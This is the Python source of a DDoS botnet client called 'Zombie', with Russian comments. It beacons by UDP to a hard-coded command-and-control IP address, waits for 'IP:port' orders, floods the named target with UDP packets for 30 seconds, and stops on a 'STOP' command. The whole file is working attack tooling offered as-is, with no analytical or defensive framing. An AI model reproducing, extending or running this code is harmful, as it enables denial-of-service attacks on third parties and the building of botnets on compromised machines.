import socket
import time
import threading
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(), logging.FileHandler('zombie.log')]
)

class Zombie:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.server_ip = "212.41.7.231"  # Заменить на реальный IP
        self.running = True
        self.current_attack = None
        self.attack_thread = None

    def start(self):
        threading.Thread(target=self.heartbeat, daemon=True).start()
        threading.Thread(target=self.listen_commands, daemon=True).start()

    def heartbeat(self):
        while self.running:
            try:
                self.sock.sendto(b"ALIVE", (self.server_ip, 6358))
                time.sleep(5)
            except Exception as e:
                logging.error(f"Heartbeat error: {str(e)}")

    def listen_commands(self):
        while self.running:
            try:
                data, _ = self.sock.recvfrom(1024)
                if data == b"STOP":
                    self.stop_attack()
                elif b":" in data:
                    self.process_command(data.decode())
            except Exception as e:
                logging.error(f"Command error: {str(e)}")

    def process_command(self, command):
        try:
            target_ip, port = command.split(":")
            if not self.is_attacking():
                self.current_attack = (target_ip, int(port))
                self.attack_thread = threading.Thread(target=self.attack)
                self.attack_thread.start()
        except Exception as e:
            logging.error(f"Invalid command: {str(e)}")

    def attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x00" * 1024
            target = self.current_attack
            
            logging.info(f"🔥 Attacking {target[0]}:{target[1]}")
            end_time = time.time() + 30
            
            while time.time() < end_time and self.running:
                sock.sendto(payload, target)
                
            sock.close()
            logging.info("✅ Attack finished")
            self.current_attack = None
            
        except Exception as e:
            logging.error(f"❗ Attack failed: {str(e)}")

    def stop_attack(self):
        if self.is_attacking():
            self.running = False
            self.attack_thread.join()
            self.running = True  # Восстанавливаем флаг для новых атак
            logging.info("🛑 Attack stopped by command")

    def is_attacking(self):
        return self.attack_thread and self.attack_thread.is_alive()

if __name__ == '__main__':
    zombie = Zombie()
    zombie.start()
    try:
        while True: 
            time.sleep(1)
    except KeyboardInterrupt:
        zombie.running = False
